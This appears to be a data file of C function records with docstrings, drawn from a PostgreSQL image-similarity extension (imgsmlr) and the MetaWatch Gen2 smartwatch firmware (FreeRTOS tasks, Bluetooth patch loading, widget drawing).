{"docstring": "/*\n * Output for type \"signature\": return textual representation of vector.\n */\n", "func_signal": "Datum\nsignature_out(PG_FUNCTION_ARGS)", "code": "{\n\tSignature *signature = (Signature *)PG_GETARG_POINTER(0);\n\tStringInfoData buf;\n\tint i;\n\n\tinitStringInfo(&buf);\n\n\tappendStringInfoChar(&buf, '(');\n\tfor (i = 0; i < SIGNATURE_SIZE; i++)\n\t{\n\t\tif (i > 0)\n\t\t\tappendStringInfo(&buf, \", \");\n\t\tappendStringInfo(&buf, \"%f\", signature->values[i]);\n\t}\n\tappendStringInfoChar(&buf, ')');\n\n\tPG_FREE_IF_COPY(signature, 0);\n\tPG_RETURN_CSTRING(buf.data);\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Shuffle pattern values in order to make further comparisons less sensitive\n * to shift. Shuffling is actually a build of \"w\" radius in rectangle\n * \"(x, y) - (x + sX, y + sY)\".\n */\n", "func_signal": "static void\nshuffle(PatternData *dst, PatternData *src, int x, int y, int sX, int sY, int w)", "code": "{\n\tint i, j;\n\n\tfor (i = x; i < x + sX; i++)\n\t{\n\t\tfor (j = y; j < y + sY; j++)\n\t\t{\n\t\t\tint ii, jj;\n\t\t\tint ii_min = Max(x, i - w),\n\t\t\t\tii_max = Min(x + sX, i + w + 1),\n\t\t\t\tjj_min = Max(y, j - w),\n\t\t\t\tjj_max = Min(y + sY, j + w + 1);\n\t\t\tfloat sum = 0.0f, sum_r = 0.0f;\n\n\t\t\tfor (ii = ii_min; ii < ii_max; ii++)\n\t\t\t{\n\t\t\t\tfor (jj = jj_min; jj < jj_max; jj++)\n\t\t\t\t{\n\t\t\t\t\tfloat r = (i - ii) * (i - ii) + (j - jj) * (j - jj);\n\t\t\t\t\tr = 1.0f - sqrt(r) / (float)w;\n\t\t\t\t\tif (r <= 0.0f)\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\tsum += src->values[ii][jj] * src->values[ii][jj] * r;\n\t\t\t\t\tsum_r += r;\n\t\t\t\t}\n\t\t\t}\n\t\t\tAssert (sum >= 0.0f);\n\t\t\tAssert (sum_r > 0.0f);\n\t\t\tdst->values[i][j] = sqrt(sum / sum_r);\n\t\t}\n\t}\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Do Haar wavelet transform over pattern.\n */\n", "func_signal": "static void\nwaveletTransform(PatternData *dst, PatternData *src, int size)", "code": "{\n\tif (size > 1)\n\t{\n\t\tint i, j;\n\t\tsize /= 2;\n\t\tfor (i = 0; i < size; i++)\n\t\t{\n\t\t\tfor (j = 0; j < size; j++)\n\t\t\t{\n\t\t\t\tdst->values[i + size][j] =        ( - src->values[2 * i][2 * j]     + src->values[2 * i + 1][2 * j]\n\t\t\t\t                                    - src->values[2 * i][2 * j + 1] + src->values[2 * i + 1][2 * j + 1]) / 4.0f;\n\t\t\t\tdst->values[i][j + size] =        ( - src->values[2 * i][2 * j]     - src->values[2 * i + 1][2 * j]\n\t\t\t\t                                    + src->values[2 * i][2 * j + 1] + src->values[2 * i + 1][2 * j + 1]) / 4.0f;\n\t\t\t\tdst->values[i + size][j + size] = (   src->values[2 * i][2 * j]     - src->values[2 * i + 1][2 * j]\n\t\t\t\t                                    - src->values[2 * i][2 * j + 1] + src->values[2 * i + 1][2 * j + 1]) / 4.0f;\n\t\t\t}\n\t\t}\n\t\tfor (i = 0; i < size; i++)\n\t\t{\n\t\t\tfor (j = 0; j < size; j++)\n\t\t\t{\n\t\t\t\tsrc->values[i][j] =               (   src->values[2 * i][2 * j]     + src->values[2 * i + 1][2 * j]\n\t\t\t\t                                    + src->values[2 * i][2 * j + 1] + src->values[2 * i + 1][2 * j + 1]) / 4.0f;\n\t\t\t}\n\t\t}\n\t\twaveletTransform(dst, src, size);\n\t}\n\telse\n\t{\n\t\tdst->values[0][0] = src->values[0][0];\n\t}\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Load pattern from png image in bytea.\n */\n", "func_signal": "Datum\npng2pattern(PG_FUNCTION_ARGS)", "code": "{\n\tbytea *img = PG_GETARG_BYTEA_P(0);\n\tPattern *pattern;\n\tgdImagePtr im;\n\n\tim = gdImageCreateFromPngPtr(VARSIZE_ANY_EXHDR(img), VARDATA_ANY(img));\n\tPG_FREE_IF_COPY(img, 0);\n\tif (!im)\n\t{\n\t\telog(NOTICE, \"Error loading png\");\n\t\tPG_RETURN_NULL();\n\t}\n\tpattern = image2pattern(im);\n\tgdImageDestroy(im);\n\n\tif (pattern)\n\t\tPG_RETURN_BYTEA_P(pattern);\n\telse\n\t\tPG_RETURN_NULL();\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Normalize pattern: make it minimal value equal to 0 and\n * maximum value equal to 1.\n */\n", "func_signal": "static void\nnormalizePattern(PatternData *pattern)", "code": "{\n\tfloat min = 1.0f, max = 0.0f, val;\n\tint i, j;\n\tfor (i = 0; i < PATTERN_SIZE; i++)\n\t{\n\t\tfor (j = 0; j < PATTERN_SIZE; j++)\n\t\t{\n\t\t\tval = pattern->values[i][j];\n\t\t\tif (val < min) min = val;\n\t\t\tif (val > max) max = val;\n\n\t\t}\n\t}\n\tfor (i = 0; i < PATTERN_SIZE; i++)\n\t{\n\t\tfor (j = 0; j < PATTERN_SIZE; j++)\n\t\t{\n\t\t\tpattern->values[i][j] = (pattern->values[i][j] - min) / (max - min);\n\t\t}\n\t}\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Calculate summary of squares in rectangle \"(x, y) - (x + sX, y + sY)\".\n */\n", "func_signal": "static float\ncalcSumm(PatternData *pattern, int x, int y, int sX, int sY)", "code": "{\n\tint i, j;\n\tfloat summ = 0.0f, val;\n\tfor (i = x; i < x + sX; i++)\n\t{\n\t\tfor (j = y; j < y + sY; j++)\n\t\t{\n\t\t\tval = pattern->values[i][j];\n\t\t\tsumm += val * val;\n\t\t}\n\t}\n\treturn sqrt(summ);\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Make short signature from pattern.\n */\n", "func_signal": "static void\ncalcSignature(PatternData *pattern, Signature *signature)", "code": "{\n\tint size = PATTERN_SIZE / 2;\n\tint i = 0;\n\tfloat mult = 1.0f;\n\n\twhile (size > 1)\n\t{\n\t\tsize /= 2;\n\t\tsignature->values[i++] = mult * calcSumm(pattern, size, 0, size, size);\n\t\tsignature->values[i++] = mult * calcSumm(pattern, 0, size, size, size);\n\t\tsignature->values[i++] = mult * calcSumm(pattern, size, size, size, size);\n\t\tmult *= 2.0f;\n\t}\n\tsignature->values[SIGNATURE_SIZE - 1] = pattern->values[0][0];\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Distance between patterns is square root of the summary of difference between\n * regions of wavelet-transformed pattern corrected by their sized. Difference\n * of each region is summary of square difference between values.\n */\n", "func_signal": "Datum\npattern_distance(PG_FUNCTION_ARGS)", "code": "{\n\tbytea *patternDataA = PG_GETARG_BYTEA_P(0);\n\tPatternData *patternA = (PatternData *)VARDATA_ANY(patternDataA);\n\tbytea *patternDataB = PG_GETARG_BYTEA_P(1);\n\tPatternData *patternB = (PatternData *)VARDATA_ANY(patternDataB);\n\tfloat distance = 0.0f, val;\n\tint size = PATTERN_SIZE;\n\tfloat mult = 1.0f;\n\n\twhile (size > 1)\n\t{\n\t\tsize /= 2;\n\t\tdistance += mult * calcDiff(patternA, patternB, size, 0, size, size);\n\t\tdistance += mult * calcDiff(patternA, patternB, 0, size, size, size);\n\t\tdistance += mult * calcDiff(patternA, patternB, size, size, size, size);\n\t\tmult *= 2.0f;\n\t}\n\tval = patternA->values[0][0] - patternB->values[0][0];\n\tdistance += mult * val * val;\n\tdistance = sqrt(distance);\n\n\tPG_RETURN_FLOAT4(distance);\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Input \"pattern\" type from its textual representation.\n */\n", "func_signal": "Datum\npattern_in(PG_FUNCTION_ARGS)", "code": "{\n\tchar\t   *source = PG_GETARG_CSTRING(0);\n\tPattern\t   *pattern = (Pattern *) palloc(sizeof(Pattern));\n\tchar\t   *s;\n\tint\t\t\ti, j;\n\n\tSET_VARSIZE(pattern, sizeof(Pattern));\n\ts = source;\n\tfor (i = 0; i < PATTERN_SIZE; i++)\n\t\tfor (j = 0; j < PATTERN_SIZE; j++)\n\t\t\tpattern->data.values[i][j] = read_float(&s, \"pattern\", source);\n\n\tPG_RETURN_POINTER(pattern);\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Load pattern from png image in bytea.\n */\n", "func_signal": "Datum\ngif2pattern(PG_FUNCTION_ARGS)", "code": "{\n\tbytea *img = PG_GETARG_BYTEA_P(0);\n\tPattern *pattern;\n\tgdImagePtr im;\n\n\tim = gdImageCreateFromGifPtr(VARSIZE_ANY_EXHDR(img), VARDATA_ANY(img));\n\tPG_FREE_IF_COPY(img, 0);\n\tif (!im)\n\t{\n\t\telog(NOTICE, \"Error loading gif\");\n\t\tPG_RETURN_NULL();\n\t}\n\tpattern = image2pattern(im);\n\tgdImageDestroy(im);\n\n\tif (pattern)\n\t\tPG_RETURN_BYTEA_P(pattern);\n\telse\n\t\tPG_RETURN_NULL();\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Input \"signature\" type from its textual representation.\n */\n", "func_signal": "Datum\nsignature_in(PG_FUNCTION_ARGS)", "code": "{\n\tchar\t   *source = PG_GETARG_CSTRING(0);\n\tSignature  *signature = (Signature *) palloc(sizeof(Signature));\n\tchar\t   *s;\n\tint\t\t\ti;\n\n\tSET_VARSIZE(signature, sizeof(Signature));\n\ts = source;\n\tfor (i = 0; i < SIGNATURE_SIZE; i++)\n\t\tsignature->values[i] = read_float(&s, \"signature\", source);\n\n\tPG_RETURN_POINTER(signature);\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Output for type \"pattern\": return textual representation of matrix.\n */\n", "func_signal": "Datum\npattern_out(PG_FUNCTION_ARGS)", "code": "{\n\tbytea *patternData = PG_GETARG_BYTEA_P(0);\n\tPatternData *pattern = (PatternData *) VARDATA_ANY(patternData);\n\tStringInfoData buf;\n\tint i, j;\n\n\tinitStringInfo(&buf);\n\n\tappendStringInfoChar(&buf, '(');\n\tfor (i = 0; i < PATTERN_SIZE; i++)\n\t{\n\t\tif (i > 0)\n\t\t\tappendStringInfo(&buf, \", \");\n\t\tappendStringInfoChar(&buf, '(');\n\t\tfor (j = 0; j < PATTERN_SIZE; j++)\n\t\t{\n\t\t\tif (j > 0)\n\t\t\t\tappendStringInfo(&buf, \", \");\n\t\t\tappendStringInfo(&buf, \"%f\", pattern->values[i][j]);\n\t\t}\n\t\tappendStringInfoChar(&buf, ')');\n\t}\n\tappendStringInfoChar(&buf, ')');\n\n\tPG_FREE_IF_COPY(patternData, 0);\n\tPG_RETURN_CSTRING(buf.data);\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Extract signature from pattern.\n */\n", "func_signal": "Datum\npattern2signature(PG_FUNCTION_ARGS)", "code": "{\n\tbytea *patternData = PG_GETARG_BYTEA_P(0);\n\tPatternData *pattern = (PatternData *)VARDATA_ANY(patternData);\n\tSignature *signature = (Signature *)palloc(sizeof(Signature));\n\n\tcalcSignature(pattern, signature);\n\tPG_FREE_IF_COPY(patternData, 0);\n\n#ifdef DEBUG_INFO\n\tdebugPrintSignature(signature, \"/tmp/signature.raw\");\n#endif\n\n\tPG_RETURN_POINTER(signature);\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "void vTaskSetTimeOutState( xTimeOutType * const pxTimeOut )", "code": "{\n\tpxTimeOut->xOverflowCount = xNumOfOverflows;\n\tpxTimeOut->xTimeOnEntering = xTickCount;\n}", "path": "FreeRTOS\\tasks.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/*\n * -----------------------------------------------------------\n * The Idle task.\n * ----------------------------------------------------------\n *\n * The portTASK_FUNCTION() macro is used to allow port/compiler specific\n * language extensions.  The equivalent prototype for this function is:\n *\n * void prvIdleTask( void *pvParameters );\n *\n */\n", "func_signal": "static void prvIdleTask(void *pvParameters)", "code": "{\n\t/* Stop warnings. */\n\t( void ) pvParameters;\n\n\tfor( ;; )\n\t{\n\t\t/* See if any tasks have been deleted. */\n\t\tprvCheckTasksWaitingTermination();\n\n\t\t#if ( configUSE_PREEMPTION == 0 )\n\t\t{\n\t\t\t/* If we are not using preemption we keep forcing a task switch to\n\t\t\tsee if any other task has become available.  If we are using\n\t\t\tpreemption we don't need to do this as any task becoming available\n\t\t\twill automatically get the processor anyway. */\n\t\t\ttaskYIELD();\n\t\t}\n\t\t#endif\n\n\t\t#if ( ( configUSE_PREEMPTION == 1 ) && ( configIDLE_SHOULD_YIELD == 1 ) )\n\t\t{\n\t\t\t/* When using preemption tasks of equal priority will be\n\t\t\ttimesliced.  If a task that is sharing the idle priority is ready\n\t\t\tto run then the idle task should yield before the end of the\n\t\t\ttimeslice.\n\n\t\t\tA critical region is not required here as we are just reading from\n\t\t\tthe list, and an occasional incorrect value will not matter.  If\n\t\t\tthe ready list at the idle priority contains more than one task\n\t\t\tthen a task other than the idle task is ready to execute. */\n\t\t\tif( listCURRENT_LIST_LENGTH( &( pxReadyTasksLists[ tskIDLE_PRIORITY ] ) ) > ( unsigned portBASE_TYPE ) 1 )\n\t\t\t{\n\t\t\t\ttaskYIELD();\n\t\t\t}\n\t\t}\n\t\t#endif\n\n\t\t#if ( configUSE_IDLE_HOOK == 1 )\n\t\t{\n\t\t\textern void vApplicationIdleHook( void );\n\n\t\t\t/* Call the user defined function from within the idle task.  This\n\t\t\tallows the application designer to add background functionality\n\t\t\twithout the overhead of a separate task.\n\t\t\tNOTE: vApplicationIdleHook() MUST NOT, UNDER ANY CIRCUMSTANCES,\n\t\t\tCALL A FUNCTION THAT MIGHT BLOCK. */\n\t\t\tvApplicationIdleHook();\n\t\t}\n\t\t#endif\n\t}\n}", "path": "FreeRTOS\\tasks.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/*-----------------------------------------------------------\n * TASK CREATION API documented in task.h\n *----------------------------------------------------------*/\n", "func_signal": "signed portBASE_TYPE xTaskGenericCreate( pdTASK_CODE pxTaskCode, const signed char * const pcName, unsigned short usStackDepth, void *pvParameters, unsigned portBASE_TYPE uxPriority, xTaskHandle *pxCreatedTask, portSTACK_TYPE *puxStackBuffer, const xMemoryRegion * const xRegions )", "code": "{\nsigned portBASE_TYPE xReturn;\ntskTCB * pxNewTCB;\n\n\t/* Allocate the memory required by the TCB and stack for the new task,\n\tchecking that the allocation was successful. */\n\tpxNewTCB = prvAllocateTCBAndStack( usStackDepth, puxStackBuffer );\n\n\tif( pxNewTCB != NULL )\n\t{\n\t\tportSTACK_TYPE *pxTopOfStack;\n\n\t\t#if( portUSING_MPU_WRAPPERS == 1 )\n\t\t\t/* Should the task be created in privileged mode? */\n\t\t\tportBASE_TYPE xRunPrivileged;\n\t\t\tif( ( uxPriority & portPRIVILEGE_BIT ) != 0x00 )\n\t\t\t{\n\t\t\t\txRunPrivileged = pdTRUE;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\txRunPrivileged = pdFALSE;\n\t\t\t}\n\t\t\tuxPriority &= ~portPRIVILEGE_BIT;\n\t\t#endif /* portUSING_MPU_WRAPPERS == 1 */\n\n\t\t/* Calculate the top of stack address.  This depends on whether the\n\t\tstack grows from high memory to low (as per the 80x86) or visa versa.\n\t\tportSTACK_GROWTH is used to make the result positive or negative as\n\t\trequired by the port. */\n\t\t#if( portSTACK_GROWTH < 0 )\n\t\t{\n\t\t\tpxTopOfStack = pxNewTCB->pxStack + ( usStackDepth - 1 );\n#ifdef __IAR_SYSTEMS_ICC__\n#pragma diag_suppress=Pe1053      \n#endif\n\t\t\tpxTopOfStack = ( portSTACK_TYPE * ) ( ( ( unsigned long ) pxTopOfStack ) & ( ( unsigned long ) ~portBYTE_ALIGNMENT_MASK  ) );\n#ifdef __IAR_SYSTEMS_ICC__\n#pragma diag_default=Pe1053\n#endif\n\t\t}\n\t\t#else\n\t\t{\n\t\t\tpxTopOfStack = pxNewTCB->pxStack;\n\n\t\t\t/* If we want to use stack checking on architectures that use\n\t\t\ta positive stack growth direction then we also need to store the\n\t\t\tother extreme of the stack space. */\n\t\t\tpxNewTCB->pxEndOfStack = pxNewTCB->pxStack + ( usStackDepth - 1 );\n\t\t}\n\t\t#endif\n\n\t\t/* Setup the newly allocated TCB with the initial state of the task. */\n\t\tprvInitialiseTCBVariables( pxNewTCB, pcName, uxPriority, xRegions, usStackDepth );\n\n\t\t/* Initialize the TCB stack to look as if the task was already running,\n\t\tbut had been interrupted by the scheduler.  The return address is set\n\t\tto the start of the task function. Once the stack has been initialised\n\t\tthe\ttop of stack variable is updated. */\n\t\t#if( portUSING_MPU_WRAPPERS == 1 )\n\t\t{\n\t\t\tpxNewTCB->pxTopOfStack = pxPortInitialiseStack( pxTopOfStack, pxTaskCode, pvParameters, xRunPrivileged );\n\t\t}\n\t\t#else\n\t\t{\n\t\t\tpxNewTCB->pxTopOfStack = pxPortInitialiseStack( pxTopOfStack, pxTaskCode, pvParameters );\n\t\t}\n\t\t#endif\n\n\t\t/* We are going to manipulate the task queues to add this task to a\n\t\tready list, so must make sure no interrupts occur. */\n\t\tportENTER_CRITICAL();\n\t\t{\n\t\t\tuxCurrentNumberOfTasks++;\n\t\t\tif( uxCurrentNumberOfTasks == ( unsigned portBASE_TYPE ) 1 )\n\t\t\t{\n\t\t\t\t/* As this is the first task it must also be the current task. */\n\t\t\t\tpxCurrentTCB =  pxNewTCB;\n\n\t\t\t\t/* This is the first task to be created so do the preliminary\n\t\t\t\tinitialisation required.  We will not recover if this call\n\t\t\t\tfails, but we will report the failure. */\n\t\t\t\tprvInitialiseTaskLists();\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t/* If the scheduler is not already running, make this task the\n\t\t\t\tcurrent task if it is the highest priority task to be created\n\t\t\t\tso far. */\n\t\t\t\tif( xSchedulerRunning == pdFALSE )\n\t\t\t\t{\n\t\t\t\t\tif( pxCurrentTCB->uxPriority <= uxPriority )\n\t\t\t\t\t{\n\t\t\t\t\t\tpxCurrentTCB = pxNewTCB;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t/* Remember the top priority to make context switching faster.  Use\n\t\t\tthe priority in pxNewTCB as this has been capped to a valid value. */\n\t\t\tif( pxNewTCB->uxPriority > uxTopUsedPriority )\n\t\t\t{\n\t\t\t\tuxTopUsedPriority = pxNewTCB->uxPriority;\n\t\t\t}\n\n\t\t\t#if ( configUSE_TRACE_FACILITY == 1 )\n\t\t\t{\n\t\t\t\t/* Add a counter into the TCB for tracing only. */\n\t\t\t\tpxNewTCB->uxTCBNumber = uxTaskNumber;\n\t\t\t}\n\t\t\t#endif\n\t\t\tuxTaskNumber++;\n\n\t\t\tprvAddTaskToReadyQueue( pxNewTCB );\n\n\t\t\txReturn = pdPASS;\n\t\t\ttraceTASK_CREATE( pxNewTCB );\n\t\t}\n\t\tportEXIT_CRITICAL();\n\t}\n\telse\n\t{\n\t\txReturn = errCOULD_NOT_ALLOCATE_REQUIRED_MEMORY;\n\t\ttraceTASK_CREATE_FAILED( pxNewTCB );\n\t}\n\n\tif( xReturn == pdPASS )\n\t{\n\t\tif( ( void * ) pxCreatedTask != NULL )\n\t\t{\n\t\t\t/* Pass the TCB out - in an anonymous way.  The calling function/\n\t\t\ttask can use this as a handle to delete the task later if\n\t\t\trequired.*/\n\t\t\t*pxCreatedTask = ( xTaskHandle ) pxNewTCB;\n\t\t}\n\n\t\tif( xSchedulerRunning != pdFALSE )\n\t\t{\n\t\t\t/* If the created task is of a higher priority than the current task\n\t\t\tthen it should run now. */\n\t\t\tif( pxCurrentTCB->uxPriority < uxPriority )\n\t\t\t{\n\t\t\t\tportYIELD_WITHIN_API();\n\t\t\t}\n\t\t}\n\t}\n\n\treturn xReturn;\n}", "path": "FreeRTOS\\tasks.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/* model configuration can't access data past 64k.  The function     */\n/* receives as its first parameter the offset from the beginning of  */\n/* the Patch data where the copy should begin.  The second parameter */\n/* is a pointer to a local buffer where the data is to be moved.  The*/\n/* last parameter is the number of bytes that are to be moved.       */\n/* * NOTE * The C compiler will not process the information within   */\n/*          the 'asm' statements so we must reference the parameters */\n/*          passed in to the optimizer will remove variables that are*/\n/*          not referenced.  If none of the variables are referenced */\n/*          in 'C' code then the entire function will be optimized   */\n/*          out.                                                     */\n/* * NOTE * This function will not allow an offset of 0xFFFF.        */\n", "func_signal": "void MovePatchBytes(unsigned int offset, unsigned char *dest, unsigned int length)", "code": "{\n  /* Check to make sure that the parameters passed in appear valid.    */\n  if((offset+1) && (dest) && (length))\n  {\n#ifdef __IAR_SYSTEMS_ICC__\n\n    while(length--)\n    {\n      *dest++ = *((unsigned char __data20 *)(GetPatchAddress() + offset));\n      offset++;\n    }\n      \n#else /* TI_COMPILER_VERSION */\n    if ( RadioVersion == RadioVersionCC2564 )\n    {\n#if INCLUDE_1316_PATCH\n      asm(\"LOOP_2564:\");\n      asm(\"    MOVX.B   Patch1316+0(r12),0(r13)\");  /* Move 1 bytes         */\n      asm(\"    ADD.W    #1,r12\");                   /* INC offset           */\n      asm(\"    ADD.W    #1,r13\");                   /* INC dest             */\n      asm(\"    SUB.W    #1,r14\");                   /* DEC length           */\n      asm(\"    CMP.W    #0,r14\");                   /* Check (length == 0)  */\n      asm(\"    JNE      LOOP_2564\");\n#endif\n    }\n    else\n    {\n#if INCLUDE_1315_PATCH\n      asm(\"LOOP_2560:\");\n      asm(\"    MOVX.B   Patch1315+0(r12),0(r13)\");  /* Move 1 bytes         */\n      asm(\"    ADD.W    #1,r12\");                   /* INC offset           */\n      asm(\"    ADD.W    #1,r13\");                   /* INC dest             */\n      asm(\"    SUB.W    #1,r14\");                   /* DEC length           */\n      asm(\"    CMP.W    #0,r14\");                   /* Check (length == 0)  */\n      asm(\"    JNE      LOOP_2560\");\n#endif\n    }\n#endif /* environment selection */\n  }\n  else\n  {\n    /* Clear the Packet Flag.                                         */\n    *dest = 0;\n  }\n}", "path": "Patch\\PatchSelection.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "static tskTCB *prvAllocateTCBAndStack( unsigned short usStackDepth, portSTACK_TYPE *puxStackBuffer )", "code": "{\ntskTCB *pxNewTCB;\n\n\t/* Allocate space for the TCB.  Where the memory comes from depends on\n\tthe implementation of the port malloc function. */\n\tpxNewTCB = ( tskTCB * ) pvPortMalloc( sizeof( tskTCB ) );\n\n\tif( pxNewTCB != NULL )\n\t{\n\t\t/* Allocate space for the stack used by the task being created.\n\t\tThe base of the stack memory stored in the TCB so the task can\n\t\tbe deleted later if required. */\n\t\tpxNewTCB->pxStack = ( portSTACK_TYPE * ) pvPortMallocAligned( ( ( ( size_t )usStackDepth ) * sizeof( portSTACK_TYPE ) ), puxStackBuffer );\n\n\t\tif( pxNewTCB->pxStack == NULL )\n\t\t{\n\t\t\t/* Could not allocate the stack.  Delete the allocated TCB. */\n\t\t\tvPortFree( pxNewTCB );\n\t\t\tpxNewTCB = NULL;\n\t\t}\n\t\telse\n\t\t{\n\t\t\t/* Just to help debugging. */\n\t\t\tmemset( pxNewTCB->pxStack, tskSTACK_FILL_BYTE, usStackDepth * sizeof( portSTACK_TYPE ) );\n\t\t}\n\t}\n\n\treturn pxNewTCB;\n}", "path": "FreeRTOS\\tasks.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/******************************************************************************/\n", "func_signal": "unsigned char UpdateClockWidget(void)", "code": "{\n  unsigned char Updated = FALSE;\n  unsigned char i = 0;\n\n  for (; pCurrWidgetList[i].Id != INVALID_ID && i < MAX_WIDGET_NUM; ++i)\n  {\n    if (!IS_CLOCK_WIDGET(pCurrWidgetList[i].Layout)) continue;\n\n    if (OnCurrentPage(pCurrWidgetList[i].Layout))\n    {\n      DrawClockWidget(pCurrWidgetList[i].Id);\n      Updated = TRUE;\n    }\n  }\n  return Updated;\n}", "path": "Watch\\Application\\Widget.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "signed portBASE_TYPE xTaskRemoveFromEventList( const xList * const pxEventList )", "code": "{\ntskTCB *pxUnblockedTCB;\nportBASE_TYPE xReturn;\n\n\t/* THIS FUNCTION MUST BE CALLED WITH INTERRUPTS DISABLED OR THE\n\tSCHEDULER SUSPENDED.  It can also be called from within an ISR. */\n\n\t/* The event list is sorted in priority order, so we can remove the\n\tfirst in the list, remove the TCB from the delayed list, and add\n\tit to the ready list.\n\n\tIf an event is for a queue that is locked then this function will never\n\tget called - the lock count on the queue will get modified instead.  This\n\tmeans we can always expect exclusive access to the event list here. */\n\tpxUnblockedTCB = ( tskTCB * ) listGET_OWNER_OF_HEAD_ENTRY( pxEventList );\n\tvListRemove( &( pxUnblockedTCB->xEventListItem ) );\n\n\tif( uxSchedulerSuspended == ( unsigned portBASE_TYPE ) pdFALSE )\n\t{\n\t\tvListRemove( &( pxUnblockedTCB->xGenericListItem ) );\n\t\tprvAddTaskToReadyQueue( pxUnblockedTCB );\n\t}\n\telse\n\t{\n\t\t/* We cannot access the delayed or ready lists, so will hold this\n\t\ttask pending until the scheduler is resumed. */\n\t\tvListInsertEnd( ( xList * ) &( xPendingReadyList ), &( pxUnblockedTCB->xEventListItem ) );\n\t}\n\n\tif( pxUnblockedTCB->uxPriority >= pxCurrentTCB->uxPriority )\n\t{\n\t\t/* Return true if the task removed from the event list has\n\t\ta higher priority than the calling task.  This allows\n\t\tthe calling task to know if it should force a context\n\t\tswitch now. */\n\t\txReturn = pdTRUE;\n\t}\n\telse\n\t{\n\t\txReturn = pdFALSE;\n\t}\n\n\treturn xReturn;\n}", "path": "FreeRTOS\\tasks.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/******************************************************************************/\n", "func_signal": "unsigned char QueryIncludedPatchSupportsRadio(void)", "code": "{\n  unsigned char result = 0;\n      \n  if ( RadioVersion == RadioVersionCC2564 )\n  {\n#if INCLUDE_1316_PATCH\n    result = 1;\n#endif\n  }\n  else\n  {\n#if INCLUDE_1315_PATCH\n    result = 1;\n#endif\n  }\n\n  return result;\n}", "path": "Patch\\PatchSelection.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/******************************************************************************/\n", "func_signal": "unsigned int GetPatchLength(void)", "code": "{\n  unsigned int Length = 0;\n  \n  if ( RadioVersion == RadioVersionCC2564 )\n  {\n#if INCLUDE_1316_PATCH\n\t  Length = sizeof(Patch1316);\n#endif\n  }\n  else\n  {\n#if INCLUDE_1315_PATCH\n\t  Length = sizeof(Patch1315);\n#endif\n  }\n  return Length;\n}", "path": "Patch\\PatchSelection.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/******************************************************************************/\n", "func_signal": "void WriteWidgetBuffer(tMessage *pMsg)", "code": "{\n  unsigned int Addr = GetAddr((WidgetHeader_t *)pMsg->pBuffer);\n  unsigned char *pBuf = pMsg->pBuffer + WIDGET_HEADER_LEN - SRAM_HEADER_LEN;\n//  PrintF(\"Id:%u R:%u %04X\", pBuf[1], pBuf[2], Addr);\n  pBuf[0] = SPI_WRITE;\n  pBuf[1] = Addr >> 8;\n  pBuf[2] = Addr;\n\n  Write((unsigned long)pBuf, pMsg->Length - WIDGET_HEADER_LEN, DMA_COPY);\n//  PrintQ(pBuf + 3, pMsg->Length - WIDGET_HEADER_LEN);\n}", "path": "Watch\\Application\\Widget.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
